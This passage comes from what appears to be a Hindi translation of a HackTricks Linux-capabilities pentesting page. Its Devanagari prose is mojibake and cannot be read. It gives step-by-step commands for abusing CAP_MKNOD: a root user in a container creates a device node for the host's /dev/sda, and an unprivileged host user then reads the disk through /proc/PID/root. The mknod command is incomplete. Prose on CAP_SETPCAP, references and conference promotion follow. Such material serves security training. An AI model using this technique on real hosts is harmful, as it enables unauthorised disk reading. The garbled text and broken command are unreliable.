3. ‡§π‡•ã‡§∏‡•ç‡§ü ‡§î‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•ã ‡§è‡§ï ‡§π‡•Ä ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡•á‡§Æ‡§∏‡•ç‡§™‡•á‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

**‡§ö‡§∞‡§£ :**

1. ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞, ‡§è‡§ï ‡§Æ‡§æ‡§®‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç:
1. ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® UID ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç (`id`)‡•§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è: `uid=1000(unprivileged)`‡•§
2. ‡§Ü‡§™ ‡§ú‡§ø‡§∏ ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§ï‡•ã ‡§™‡§¢‡§º‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç, ‡§â‡§∏‡•á ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç‡•§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è: `/dev/sda`
2. ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§™‡§∞, `‡§∞‡•Ç‡§ü` ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç:
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. ‡§Æ‡•á‡§ú‡§¨‡§æ‡§® ‡§™‡§∞ ‡§µ‡§æ‡§™‡§∏:
```bash
#¬†Find the PID linked to the container owns by the user "unprivileged"
#¬†Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
#¬†Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§Ö‡§¨ ‡§Ö‡§®‡§ß‡§ø‡§ï‡•É‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§∏‡•á ‡§â‡§™‡§ï‡§∞‡§£ /dev/sda ‡§ï‡•ã ‡§™‡§¢‡§º, ‡§°‡§Ç‡§™ ‡§î‡§∞ ‡§ï‡•â‡§™‡•Ä ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

### CAP\_SETPCAP

**`CAP_SETPCAP`** ‡§è‡§ï Linux ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§¶‡•Ç‡§∏‡§∞‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä, ‡§µ‡§ø‡§∞‡§æ‡§∏‡§§ ‡§î‡§∞ ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§ú‡•ã‡§°‡§º‡§®‡•á ‡§Ø‡§æ ‡§π‡§ü‡§æ‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•à‡§∏‡•á ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§Ç‡§ß ‡§π‡•à‡§Ç‡•§

`CAP_SETPCAP` ‡§µ‡§æ‡§≤‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ **‡§ï‡•á‡§µ‡§≤ ‡§â‡§®‡•ç‡§π‡•Ä‡§Ç ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§Ø‡§æ ‡§π‡§ü‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§â‡§∏‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§π‡•à‡§Ç**‡•§ ‡§Ö‡§®‡•ç‡§Ø ‡§∂‡§¨‡•ç‡§¶‡•ã‡§Ç ‡§Æ‡•á‡§Ç, ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§â‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§¶‡•Ç‡§∏‡§∞‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡•Ä ‡§µ‡§π ‡§ñ‡•Å‡§¶ ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ ‡§Ø‡§π ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§Ç‡§ß ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Ö‡§™‡§®‡•á ‡§∏‡•ç‡§µ‡§Ø‡§Ç ‡§ï‡•á ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§¶‡•Ç‡§∏‡§∞‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§ø‡§µ‡§ø‡§≤‡•á‡§ú ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§®‡•á ‡§∏‡•á ‡§∞‡•ã‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§π‡§æ‡§≤ ‡§ï‡•á ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£‡•ã‡§Ç ‡§Æ‡•á‡§Ç, `CAP_SETPCAP` ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã **‡§î‡§∞ ‡§Ö‡§ß‡§ø‡§ï ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à**‡•§ ‡§Ö‡§¨ ‡§Ø‡§π ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§ï‡•ã ‡§Ö‡§®‡§ø‡§Ø‡§Æ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•Ä ‡§¨‡§ú‡§æ‡§Ø, ‡§Ø‡§π ‡§ï‡•á‡§µ‡§≤ ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Ö‡§™‡§®‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Ø‡§æ ‡§Ö‡§™‡§®‡•á ‡§µ‡§Ç‡§∂‡§ú‡•ã‡§Ç ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§ï‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏ ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§® ‡§ï‡•ã ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ú‡•ã‡§ñ‡§ø‡§Æ‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡§æ‡§ó‡•Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§

`CAP_SETPCAP` ‡§ï‡•ã ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™‡§ï‡•ã ‡§Ö‡§™‡§®‡•Ä ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è ‡§î‡§∞ ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§Ö‡§™‡§®‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§´‡§ø‡§∞ ‡§Ü‡§™ `capset()` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§∏‡§æ‡§∞‡§æ‡§Ç‡§∂ ‡§Æ‡•á‡§Ç, `CAP_SETPCAP` ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π ‡§â‡§® ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à ‡§ú‡§ø‡§®‡§ï‡•Ä ‡§µ‡§π ‡§ñ‡•Å‡§¶ ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡•Ä ‡§ö‡§ø‡§Ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£, ‡§π‡§æ‡§≤ ‡§ï‡•á ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§á‡§∏‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§ï‡•á‡§µ‡§≤ ‡§Ö‡§™‡§®‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Ø‡§æ ‡§Ö‡§™‡§®‡•á ‡§µ‡§Ç‡§∂‡§ú‡•ã‡§Ç ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§ï‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•à‡•§

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

**‡§á‡§® ‡§â‡§¶‡§æ‡§π‡§∞‡§£‡•ã‡§Ç ‡§ï‡§æ ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§Ç‡§∂** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **‡§ï‡•á ‡§ï‡•Å‡§õ ‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡§∂‡§æ‡§≤‡§æ‡§ì‡§Ç ‡§∏‡•á ‡§≤‡§ø‡§è ‡§ó‡§è ‡§π‡•à‡§Ç**, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§á‡§® ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï ‡§§‡§ï‡§®‡•Ä‡§ï‡•ã‡§Ç ‡§ï‡§æ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡•ã ‡§Æ‡•à‡§Ç ‡§á‡§® ‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡§∂‡§æ‡§≤‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§∏‡§ø‡§´‡§æ‡§∞‡§ø‡§∂ ‡§ï‡§∞‡§§‡§æ ‡§π‡•Ç‡§Ç‡•§

**‡§Ö‡§®‡•ç‡§Ø ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **‡§∏‡•ç‡§™‡•á‡§®** ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ò‡§ü‡§®‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ø‡•Ç‡§∞‡•ã‡§™ ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§π‡•à‡•§ **‡§§‡§ï‡§®‡•Ä‡§ï‡•Ä ‡§ú‡•ç‡§û‡§æ‡§® ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§µ‡§æ ‡§¶‡•á‡§®‡•á** ‡§ï‡•á ‡§Æ‡§ø‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§•, ‡§Ø‡§π ‡§ï‡§æ‡§Ç‡§ó‡•ç‡§∞‡•á‡§∏ ‡§π‡§∞ ‡§µ‡§ø‡§∑‡§Ø ‡§Æ‡•á‡§Ç ‡§ü‡•á‡§ï‡•ç‡§®‡•ã‡§≤‡•â‡§ú‡•Ä ‡§î‡§∞ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§ú‡•ç‡§û‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§â‡§¨‡§≤‡§§‡§æ ‡§π‡•Å‡§Ü ‡§Æ‡§ø‡§≤‡§® ‡§∏‡•ç‡§•‡§≤ ‡§π‡•à‡•§

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hack
